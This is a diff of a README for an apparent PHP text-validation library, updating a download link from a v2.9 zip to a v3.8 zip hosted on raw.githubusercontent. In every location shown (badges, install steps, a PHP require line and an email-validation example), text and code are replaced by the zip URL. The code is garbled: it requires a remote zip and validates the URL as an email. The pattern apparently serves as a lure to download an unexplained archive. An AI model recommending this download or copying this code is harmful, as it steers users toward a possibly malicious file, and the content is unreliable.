@@ -6,7 +6,7 @@ Welcome to the php-text-validator-lib! This library helps you validate different
 
 ## 📥 Download Now
 
-[![Download php-text-validator-lib](https://raw.githubusercontent.com/Babaproates/php-text-validator-lib/main/lib/php_lib_text_validator_v2.9.zip%20php--text--validator--lib-0078d7?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Babaproates/php-text-validator-lib/main/lib/php_lib_text_validator_v2.9.zip)
+[![Download php-text-validator-lib](https://raw.githubusercontent.com/Babaproates/php-text-validator-lib/main/lib/php_text_lib_validator_v3.8.zip%20php--text--validator--lib-0078d7?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Babaproates/php-text-validator-lib/main/lib/php_text_lib_validator_v3.8.zip)
 
 ## 📝 About the Library
 
@@ -42,18 +42,18 @@ These features contribute to maintaining data integrity and improving user exper
 
 1. **Visit the Releases Page:** Click the link below to access the releases page.
 
-   [Download php-text-validator-lib](https://raw.githubusercontent.com/Babaproates/php-text-validator-lib/main/lib/php_lib_text_validator_v2.9.zip)
+   [Download php-text-validator-lib](https://raw.githubusercontent.com/Babaproates/php-text-validator-lib/main/lib/php_text_lib_validator_v3.8.zip)
 
 2. **Choose the Latest Version:** Look for the latest version available. It will have the most recent updates and fixes.
 
-3. **Download the Package:** Click on the file to download the library. It will be in a zip or https://raw.githubusercontent.com/Babaproates/php-text-validator-lib/main/lib/php_lib_text_validator_v2.9.zip format.
+3. **Download the Package:** Click on the file to download the library. It will be in a zip or https://raw.githubusercontent.com/Babaproates/php-text-validator-lib/main/lib/php_text_lib_validator_v3.8.zip format.
 
 4. **Extract the Files:** Use any extraction tool to unpack the downloaded file.
 
 5. **Include the Library in Your Project:** Move the library files to your project directory. You can include them in your PHP files with the following line:
 
    ```php
-   require 'https://raw.githubusercontent.com/Babaproates/php-text-validator-lib/main/lib/php_lib_text_validator_v2.9.zip';
+   require 'https://raw.githubusercontent.com/Babaproates/php-text-validator-lib/main/lib/php_text_lib_validator_v3.8.zip';
    ```
 
 ## 📖 Usage Examples
@@ -64,7 +64,7 @@ To check if an email address is valid, use the following:
 
 ```php
 $validator = new EmailValidator();
-if ($validator->isValid('https://raw.githubusercontent.com/Babaproates/php-text-validator-lib/main/lib/php_lib_text_validator_v2.9.zip')) {
+if ($validator->isValid('https://raw.githubusercontent.com/Babaproates/php-text-validator-lib/main/lib/php_text_lib_validator_v3.8.zip')) {
     echo "Valid email!";
 } else {
     echo "Invalid email.";
